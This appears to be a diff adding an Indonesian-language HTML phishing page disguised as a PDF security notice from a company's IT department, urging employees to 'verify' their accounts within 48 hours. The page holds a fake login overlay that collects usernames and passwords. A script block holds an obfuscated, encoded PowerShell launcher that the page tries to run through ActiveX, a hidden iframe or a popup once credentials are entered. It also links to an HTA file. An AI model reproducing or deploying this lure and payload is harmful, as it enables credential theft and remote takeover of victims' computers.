@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan Akun - PT. Nama Perusahaan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        .pdf-container {
+            max-width: 800px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            min-height: 1000px;
+            position: relative;
+        }
+        .pdf-header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #0078d4;
+            padding-bottom: 20px;
+        }
+        .pdf-logo {
+            width: 200px;
+            height: 60px;
+            background-color: #0078d4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .pdf-date {
+            text-align: right;
+            margin: 20px 0;
+        }
+        h1 {
+            color: #0078d4;
+            text-align: center;
+            font-size: 24px;
+        }
+        .pdf-content {
+            margin: 20px 0;
+        }
+        .warning-box {
+            background-color: #fff4e5;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .info-box {
+            background-color: #e8f4fb;
+            border-left: 4px solid #0078d4;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .steps {
+            margin: 20px 0;
+        }
+        .steps ol {
+            padding-left: 20px;
+        }
+        .steps li {
+            margin-bottom: 15px;
+        }
+        .pdf-footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #ddd;
+            padding-top: 20px;
+        }
+        /* Overlay untuk form login */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-form {
+            background-color: white;
+            padding: 30px;
+            border-radius: 5px;
+            width: 350px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+        }
+        .form-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .form-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .form-button:hover {
+            background-color: #005a9e;
+        }
+        .success-message {
+            display: none;
+            text-align: center;
+        }
+        .success-message h3 {
+            color: #28a745;
+        }
+        /* Tombol PDF */
+        .pdf-button {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            display: block;
+            width: 250px;
+            margin: 20px auto;
+            text-align: center;
+        }
+        /* Simulasi toolbar PDF */
+        .pdf-toolbar {
+            background-color: #f1f1f1;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #ddd;
+        }
+        .pdf-toolbar-left {
+            display: flex;
+            gap: 10px;
+        }
+        .pdf-toolbar-right {
+            display: flex;
+            gap: 10px;
+        }
+        .pdf-toolbar button {
+            background-color: #e1e1e1;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .pdf-page-counter {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        /* Simulasi page number */
+        .pdf-page-number {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+    <script>
+        // Payload PowerShell yang akan dijalankan saat verifikasi berhasil
+        var payload = 'powershell -noP -sta -w 1 -enc  JgAoACIAewAwAH0AewAyAH0AewAxAH0AIgAgAC0AZgAgACcAUwBlAHQALQBpACcALAAnAE0AJwAsACcAdABlACcAKQAgACAAKAAnAHYAYQBSAGkAQQBCAEwAZQAnACsAJwA6AGwAJwArACcAMwA1AEYAYQAnACsAJwAwACcAKQAgACgAIAAgAFsAVABZAHAARQBdACgAIgB7ADcAfQB7ADYAfQB7ADMAfQB7ADIAfQB7ADEAfQB7ADQAfQB7ADAAfQB7ADgAfQB7ADUAfQAiAC0AZgAnAEkATgB0ACcALAAnAG4ARQBUACcALAAnAGUATQAuACcALAAnAHQAJwAsACcALgBzAEUAUgB2AGkAYwBlAHAATwAnACwAJwBlAHIAJwAsACcAcwAnACwAJwBTAHkAJwAsACcAbQBBAG4AYQBHACcAKQAgACkAIAAgADsAIAAgACAALgAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAJwB0AGUAJwAsACcAbQAnACwAJwBzAGUAdAAtAEkAJwApACAAIAAoACIAewAxAH0AewAyAH0AewAwAH0AIgAgAC0AZgAnAFoAQwB5AGoAJwAsACcAVgBhACcALAAnAFIAaQBhAGIAbABFADoAJwApACAAIAAoAFsAdABZAFAAZQBdACgAIgB7ADEAfQB7ADIAfQB7ADMAfQB7ADQAfQB7ADAAfQAiAC0AZgAgACcAZwAnACwAJwBUAEUAWABUAC4AZQBOACcALAAnAEMAJwAsACcATwBEAGkAJwAsACcATgAnACkAKQAgACAAOwAgACAAIAAkAHsAQgBgAEgAMwA1AHEAfQA9AFsAdAB5AFAAZQBdACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAE4AdgBlAHIAdAAnACwAJwBjAG8AJwApACAAOwAgACAAJgAoACIAewAwAH0AewAxAH0AIgAtAGYAJwBTAEUAVAAtAEkAJwAsACcAdABlAG0AJwApACAAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIAIAAtAGYAJwBWAEEAJwAsACcAbAAnACwAJwBSAGkAQQBCAGwAZQA6AFUAMwAnACkAIAAgACgAIABbAHQAWQBwAEUAXQAoACIAewAwAH0AewA0AH0AewAxAH0AewAyAH0AewAzAH0AIgAtAEYAIAAnAHMAWQBzAHQARQBtACcALAAnAGUAYgBSAGUAJwAsACcAUQBVAGUAJwAsACcAcwBUACcALAAnAC4AbgBlAFQALgB3ACcAKQApACAAIAA7ACAAIAAgACQAewBFAGAAUgB5AH0APQAgAFsAVAB5AHAARQBdACgAIgB7ADUAfQB7ADIAfQB7ADEAfQB7ADYAfQB7ADAAfQB7ADMAfQB7ADQAfQAiACAALQBGACcAZABFAG4AJwAsACcAVAAuACcALAAnAHkAUwBUAEUATQAuAG4ARQAnACwAJwBUAGkAJwAsACcAQQBMAGMAQQBDAEgARQAnACwAJwBTACcALAAnAGMAUgBFACcAKQAgACAAOwAgACAAIAAgACYAKAAiAHsAMgB9AHsAMwB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBCAGwAZQAnACwAJwBhACcALAAnAFMARQBUAC0AdgBBACcALAAnAFIASQAnACkAIAAgACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACAAJwAzAFYAJwAsACcAUQAnACkAIAAoACAAWwBUAFkAcABFAF0AKAAiAHsAMAB9AHsAMQB9AHsAMwB9AHsAMgB9AHsANAB9ACIALQBmACAAJwBzAFkAcwB0AEUAJwAsACcATQAuACcALAAnAHQALgBFAE4AQwBvAGQAJwAsACcAVABlAFgAJwAsACcASQBuAEcAJwApACAAKQAgADsAIABJAGYAKAAkAHsAcABzAHYARQBgAFIAYABTAGAAaQBvAE4AdABBAGIAbABlAH0ALgAiAFAAUwB2AEUAYABSAFMAaQBgAE8AbgAiAC4AIgBtAGEASgBgAG8AUgAiACAALQBnAGUAIAAzACkAewB9ADsAIAAoAC4AKAAiAHsAMgB9AHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBUAC0ASQBUACcALAAnAEUATQAnACwAJwBnAGUAJwApACAAIAAoACcAdgBBAHIASQBhAEIATABlACcAKwAnADoATAAnACsAJwAzADUAZgBhACcAKwAnADAAJwApACkALgAiAHYAYQBgAGwAdQBlACIAOgA6ACIAZQB4AGAAcABlAGMAdAAxADAAMABDAE8AYABOAGAAVABpAG4AVQBlACIAPQAwADsAJAB7AFcAQwB9AD0ALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAgACcAZQB3AC0ATwBiACcALAAnAE4AJwAsACcAagBlAGMAdAAnACkAIAAoACIAewAyAH0AewAwAH0AewAxAH0AewAzAH0AIgAtAGYAJwB0ACcALAAnAC4AVwBlAGIAQwBsAGkAZQAnACwAJwBTAHkAcwB0AGUAbQAuAE4AZQAnACwAJwBuAHQAJwApADsAJAB7AFUAfQA9ACgAKAAiAHsAMAB9AHsAOQB9AHsANwB9AHsANQB9AHsANgB9AHsAMQAwAH0AewAxADMAfQB7ADIAfQB7ADEANAB9AHsAOAB9AHsAMQAyAH0AewAzAH0AewAxADEAfQB7ADEAfQB7ADQAfQAiACAALQBmACAAJwBNAG8AegBpACcALAAnACkAIABsAGkAJwAsACcAVwA2ADQAJwAsACcAOwAgAHIAdgAnACwAJwBrAGUAIABHAGUAYwBrAG8AJwAsACcALgAwACAAKABXACcALAAnAGkAJwAsACcAbABhAC8ANQAnACwAJwBkAGUAbgB0AC8ANwAuACcALAAnAGwAJwAsACcAbgBkAG8AdwBzACAATgBUACAANgAnACwAJwA6ADEAMQAuADAAJwAsACcAMAAnACwAJwAuADEAOwAgAFcATwAnACwAJwA7ACAAVAByAGkAJwApACkAOwAkAHsAUwBgAEUAcgB9AD0AJAAoACAAKAAgACYAKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAcgAnACwAJwBEAGkAJwApACAAIAAoACIAewAyAH0AewAxAH0AewAwAH0AewAzAH0AIgAtAGYAJwBBAEIATABlADoAegBjACcALAAnAFIAaQAnACwAJwB2AGEAJwAsACcAWQBqACcAKQAgACkALgAiAHYAYQBsAGAAVQBlACIAOgA6ACIAVQBOAEkAYABjAE8ARABlACIALgAiAGcAZQBgAFQAUwB0AHIAYABpAE4ARwAiACgAIAAgACgALgAoACcAZwBJACcAKQAgACgAIgB7ADIAfQB7ADAAfQB7ADMAfQB7ADEAfQAiACAALQBmACcAYgBMACcALAAnADMANQBRACcALAAnAFYAYQByAGkAQQAnACwAJwBlADoAYgBoACcAKQAgACkALgAiAFYAYQBgAEwAdQBlACIAOgA6ACgAIgB7ADEAfQB7ADAAfQB7ADIAfQB7ADMAfQAiACAALQBmACAAJwBhAHMAZQA2ACcALAAnAEYAcgBvAG0AQgAnACwAJwA0AFMAdAAnACwAJwByAGkAbgBnACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMQAxAH0AewAzAH0AewA0AH0AewA4AH0AewAxADQAfQB7ADUAfQB7ADAAfQB7ADEAfQB7ADEAMgB9AHsANwB9AHsAOQB9AHsAMQAwAH0AewA2AH0AewAyAH0AewAxADMAfQAiAC0AZgAgACcAdQBBACcALAAnAEQARQBBAE4AZwBBADQAQQBDADQAQQBPAFEAQQAnACwAJwA0AEEAJwAsACcAQQBCADAAQQBIAFEAQQAnACwAJwBjAEEAQQA2AEEAQwA4AEEATAB3ACcALAAnAEEATQBnAEEAJwAsACcARQBBAE8AZwBBACcALAAnAEMANAAnACwAJwBBAHgAQQBEACcALAAnAEEAJwAsACcATQBRAEEAeQBBAEQAJwAsACcAYQAnACwAJwB6AEEAJwAsACcARABBAEEAJwAsACcAawAnACkAKQApACkAOwAkAHsAdAB9AD0AKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAHMALgBwAGgAcAAnACwAJwAvAG4AZQB3ACcAKQA7ACQAewB3AGAAYwB9AC4AIgBIAGUAYQBgAGQARQBSAFMAIgAuACgAIgB7ADEAfQB7ADAAfQAiACAALQBmACcAZAAnACwAJwBBAGQAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAyAH0AewAwAH0AewAxAH0AIgAtAGYAJwBzAGUAcgAtAEEAZwAnACwAJwBlAG4AdAAnACwAJwBVACcAKQAsACQAewB1AH0AKQA7ACQAewBXAEMAfQAuACIAcABgAFIATwBYAFkAIgA9ACAAIAAoAC4AKAAiAHsAMwB9AHsAMgB9AHsAMQB9AHsAMAB9ACIALQBmACcARQAnACwAJwBiAEwAJwAsACcAdAAtAFYAQQByAGkAYQAnACwAJwBHAGUAJwApACAAIAAoACIAewAwAH0AewAxAH0AIgAtAGYAJwB1ACcALAAnADMATAAnACkAIAApAC4AIgBWAGEATABgAFUARQAiADoAOgAiAEQAYABFAGYAYABBAFUAbABUAHcARQBCAGAAUABSAGAAbwBYAHkAIgA7ACQAewB3AEMAfQAuACIAcABSAGAATwBYAHkAIgAuACIAQwBgAFIARQBEAGAAZQBuAHQAaQBBAGwAcwAiACAAPQAgACAAKAAgACAALgAoACIAewAxAH0AewAwAH0AewAyAH0AIgAgAC0AZgAgACcATABkAEkAdAAnACwAJwBjAEgASQAnACwAJwBlAG0AJwApACAAKAAnAFYAYQBSAGkAJwArACcAQQBCAEwAJwArACcAZQA6ACcAKwAnAEUAcgBZACcAKQApAC4AIgB2AEEAYABMAFUAZQAiADoAOgAiAEQARQBGAEEAVQBsAFQAbgBFAFQAYABXAE8AYABSAEsAYABjAFIAZQBgAEQAZQBOAHQAaQBgAEEATABTACIAOwAkAHsAUwBDAGAAUgBpAHAAdAA6AHAAUgBgAE8AWAB5AH0AIAA9ACAAJAB7AFcAYABDAH0ALgAiAFAAYABSAG8AWABZACIAOwAkAHsASwB9AD0AIAAoACYAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwB2AGEAJwAsACcAUgBpAGEAYgBMAEUAJwApACAAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAJwBxACcALAAnADMAdgAnACkAKQAuACIAdgBgAEEAbAB1AEUAIgA6ADoAIgBhAGAAUwBjAGkASQAiAC4AKAAiAHsAMAB9AHsAMQB9AHsAMgB9ACIAIAAtAGYAJwBHAGUAdABCAHkAJwAsACcAdABlACcALAAnAHMAJwApAC4ASQBuAHYAbwBrAGUAKAAoACIAewAyAH0AewA1AH0AewAzAH0AewAwAH0AewAxAH0AewA0AH0AewA3AH0AewA2AH0AIgAtAGYAIAAnAHEAegAnACwAJwBtAEkAVwBYADgAKgB1ADsAJwAsACcAWgBNAFQAJwAsACcAYgA0AGgAJwAsACcAMAAnACwAJwBWAC0AKABuACcALAAnAGkAJwAsACcAMQAyADcAVQBOACkAWwAlAD0AagAnACkAKQA7ACQAewByAH0APQB7ACQAewBkAH0ALAAkAHsAawB9AD0AJAB7AEEAUgBgAGcAUwB9ADsAJAB7AFMAfQA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAmACgAJwAlACcAKQB7ACQAewBqAH0APQAoACQAewBKAH0AKwAkAHsAUwB9AFsAJAB7AF8AfQBdACsAJAB7AEsAfQBbACQAewBfAH0AJQAkAHsAawB9AC4AIgBDAG8AYABVAE4AdAAiAF0AKQAlADIANQA2ADsAJAB7AFMAfQBbACQAewBfAH0AXQAsACQAewBzAH0AWwAkAHsAagB9AF0APQAkAHsAcwB9AFsAJAB7AGoAfQBdACwAJAB7AHMAfQBbACQAewBfAH0AXQB9ADsAJAB7AGQAfQB8ACYAKAAnACUAJwApAHsAJAB7AEkAfQA9ACgAJAB7AEkAfQArADEAKQAlADIANQA2ADsAJAB7AEgAfQA9ACgAJAB7AGgAfQArACQAewBTAH0AWwAkAHsASQB9AF0AKQAlADIANQA2ADsAJAB7AHMAfQBbACQAewBpAH0AXQAsACQAewBTAH0AWwAkAHsAaAB9AF0APQAkAHsAcwB9AFsAJAB7AGgAfQBdACwAJAB7AHMAfQBbACQAewBpAH0AXQA7ACQAewBfAH0ALQBiAHgAbwByACQAewBzAH0AWwAoACQAewBTAH0AWwAkAHsAaQB9AF0AKwAkAHsAcwB9AFsAJAB7AGgAfQBdACkAJQAyADUANgBdAH0AfQA7ACQAewB3AGMAfQAuACIAaABlAGAAQQBkAGUAcgBzACIALgAoACIAewAwAH0AewAxAH0AIgAtAGYAIAAnAEEAZAAnACwAJwBkACcAKQAuAEkAbgB2AG8AawBlACgAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAGUAJwAsACcAQwBvAG8AawBpACcAKQAsACgAIgB7ADQAfQB7ADMAfQB7ADUAfQB7ADgAfQB7ADIAfQB7ADkAfQB7ADcAfQB7ADYAfQB7ADAAfQB7ADEAfQAiAC0AZgAgACcAQwB4ADEAWAA5ADgAeQBoAEsASgBaAFkATgAnACwAJwA4AD0AJwAsACcAdgAnACwAJwBpAHcARgBVAFYARgBEAFMAaABkAFgAJwAsACcAVQAnACwAJwBmAEMAPQAvAHoAYwAnACwAJwA5AEUAOABFAGMAeAAnACwAJwBnACcALAAnADQAJwAsACcAcgAnACkAKQA7ACQAewBkAEEAYABUAEEAfQA9ACQAewBXAEMAfQAuACgAIgB7ADMAfQB7ADEAfQB7ADIAfQB7ADAAfQAiAC0AZgAnAGEAJwAsACcAbwB3AG4AbABvACcALAAnAGEAZABEAGEAdAAnACwAJwBEACcAKQAuAEkAbgB2AG8AawBlACgAJAB7AFMAYABlAHIAfQArACQAewB0AH0AKQA7ACQAewBpAGAAVgB9AD0AJAB7AEQAYQBgAFQAQQB9AFsAMAAuAC4AMwBdADsAJAB7AGQAQQBgAFQAQQB9AD0AJAB7AGQAQQBgAFQAYQB9AFsANAAuAC4AJAB7AEQAYQBgAFQAQQB9AC4AIgBsAEUATgBgAEcAVABIACIAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJAB7AFIAfQAgACQAewBkAEEAYABUAGEAfQAgACgAJAB7AEkAYABWAH0AKwAkAHsAawB9ACkAKQB8AC4AKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBYACcALAAnAEkARQAnACkA';
+    </script>
+</head>
+<body>
+    <!-- Simulasi toolbar PDF -->
+    <div class="pdf-toolbar">
+        <div class="pdf-toolbar-left">
+            <button>File</button>
+            <button>Edit</button>
+            <button>View</button>
+            <button>Tools</button>
+        </div>
+        <div class="pdf-toolbar-right">
+            <div class="pdf-page-counter">
+                <span>Page 1 of 1</span>
+                <button>-</button>
+                <button>+</button>
+            </div>
+            <button>Print</button>
+            <button>Download</button>
+        </div>
+    </div>
+
+    <div class="pdf-container">
+        <div class="pdf-header">
+            <div class="pdf-logo">PT. NAMA PERUSAHAAN</div>
+            <div class="pdf-date">Tanggal: 11 Maret 2025</div>
+        </div>
+
+        <h1>PEMBERITAHUAN PENTING: Verifikasi Keamanan Akun Diperlukan</h1>
+
+        <div class="pdf-content">
+            <p>Kepada Yth. Karyawan,</p>
+            
+            <p>Berdasarkan audit keamanan terbaru, tim Keamanan IT kami telah mengidentifikasi beberapa akun yang memerlukan verifikasi tambahan untuk memastikan kepatuhan terhadap kebijakan keamanan perusahaan yang baru.</p>
+            
+            <p><strong>Akun Anda termasuk dalam daftar yang memerlukan verifikasi segera.</strong></p>
+            
+            <div class="warning-box">
+                <p><strong>PENTING:</strong> Verifikasi harus diselesaikan dalam waktu 48 jam. Akun yang tidak diverifikasi akan dibatasi aksesnya mulai 13 Maret 2025.</p>
+            </div>
+            
+            <div class="info-box">
+                <p><strong>UNTUK MELANJUTKAN PROSES VERIFIKASI:</strong></p>
+                <p>Klik tombol "Verifikasi Akun Saya" di bawah ini untuk memulai proses verifikasi keamanan.</p>
+            </div>
+            
+            <a href="verification.hta" class="pdf-button" style="text-decoration: none; color: white;">VERIFIKASI AKUN SAYA</a>
+            
+            <p>Jika Anda mengalami masalah dengan proses verifikasi, silakan hubungi Helpdesk IT di nomor ext. 5500.</p>
+            
+            <p>Terima kasih atas kerja sama Anda dalam menjaga keamanan infrastruktur perusahaan kita.</p>
+            
+            <p>Hormat kami,</p>
+            <p>
+                <strong>Ahmad Sulaiman<br>
+                Kepala Keamanan IT<br>
+                PT. Nama Perusahaan<br>
+                ahmad.sulaiman@perusahaan.co.id</strong>
+            </p>
+        </div>
+
+        <div class="pdf-footer">
+            <p>CATATAN KERAHASIAAN: Dokumen ini berisi informasi rahasia dan ditujukan hanya untuk penerima yang dituju. Jika Anda menerima dokumen ini karena kesalahan, harap beri tahu pengirim dan hapus salinan dari sistem Anda.</p>
+            <p>&copy; 2025 PT. Nama Perusahaan - Semua Hak Dilindungi Undang-Undang</p>
+        </div>
+        
+        <div class="pdf-page-number">1/1</div>
+    </div>
+
+    <!-- Overlay untuk form login -->
+    <div class="overlay" id="loginOverlay">
+        <div class="login-form">
+            <div class="form-header">
+                <h2>Verifikasi Keamanan Akun</h2>
+                <p>Silakan masukkan kredensial perusahaan Anda untuk melanjutkan</p>
+            </div>
+            <div id="loginFormContent">
+                <div class="form-group">
+                    <label for="username">Username / Email</label>
+                    <input type="text" id="username" name="username" placeholder="Masukkan username atau email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Masukkan password" required>
+                </div>
+                <button class="form-button" onclick="processLogin()">Verifikasi Akun</button>
+            </div>
+            <div id="successMessage" class="success-message">
+                <h3>Verifikasi Berhasil!</h3>
+                <p>Terima kasih telah memverifikasi akun Anda.</p>
+                <p>Sistem keamanan telah diperbarui.</p>
+                <p>Halaman ini akan ditutup dalam beberapa detik...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Fungsi untuk menampilkan form login
+        function showLoginForm() {
+            document.getElementById('loginOverlay').style.display = 'flex';
+        }
+        
+        // Fungsi untuk memproses login
+        function processLogin() {
+            // Ambil nilai username dan password
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            // Validasi sederhana
+            if(username && password) {
+                // Simpan kredensial di log browser (hanya untuk debugging)
+                console.log("Kredensial yang diambil:", username, password);
+                
+                // Tampilkan pesan sukses
+                document.getElementById('loginFormContent').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                
+                // Jalankan payload setelah beberapa detik
+                setTimeout(function() {
+                    runPayload();
+                    // Tutup overlay setelah beberapa detik
+                    setTimeout(function() {
+                        document.getElementById('loginOverlay').style.display = 'none';
+                        // Buka jendela baru dengan payload
+                        var newWindow = window.open('', '_blank', 'width=1,height=1');
+                        if(newWindow) {
+                            newWindow.document.write('<html><head><script>var c= "' + payload + '"; try { new ActiveXObject("WScript.Shell").Run(c); } catch(e) { console.log("ActiveX tidak tersedia"); }<\/script></head><body><script>self.close();<\/script></body></html>');
+                            newWindow.document.close();
+                        }
+                    }, 3000);
+                }, 1000);
+            }
+        }
+        
+        // Fungsi untuk menjalankan payload
+        function runPayload() {
+            try {
+                // Coba jalankan payload PowerShell melalui ActiveX (hanya berfungsi di Internet Explorer)
+                try {
+                    var shell = new ActiveXObject("WScript.Shell");
+                    shell.Run(payload);
+                    console.log("Payload dijalankan melalui ActiveX");
+                    return true;
+                } catch (e) {
+                    console.log("ActiveX tidak tersedia, mencoba metode alternatif");
+                    
+                    // Metode alternatif: gunakan iframe tersembunyi
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.srcdoc = '<html><head><script>var c= "' + payload + '"; try { new ActiveXObject("WScript.Shell").Run(c); } catch(e) { console.log("ActiveX tidak tersedia di iframe"); }<\/script></head><body></body></html>';
+                    document.body.appendChild(iframe);
+                    
+                    return true;
+                }
+            } catch (e) {
+                console.error("Error running payload:", e);
+                return false;
+            }
+        }
+        
+        // Tampilkan form login setelah beberapa detik (opsional)
+        setTimeout(function() {
+            // Uncomment baris di bawah jika ingin form login muncul otomatis setelah beberapa detik
+            // showLoginForm();
+        }, 5000);
+    </script>
+</body>
+</html> 
